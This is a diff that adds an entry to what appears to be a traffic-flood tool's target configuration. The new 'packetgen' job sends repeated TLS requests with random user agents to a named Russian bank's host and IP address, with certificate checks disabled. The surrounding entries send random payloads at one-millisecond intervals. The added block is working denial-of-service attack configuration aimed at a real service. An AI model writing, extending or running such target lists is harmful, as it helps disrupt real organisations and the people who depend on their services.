@@ -12025,6 +12025,36 @@
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
+    },
+    {
+      "type": "packetgen",
+      "name": "www.altbank.ru",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "85.202.228.34:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://www.altbank.ru/v2/s/bsi.dll",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 2
     }
   ]
 }
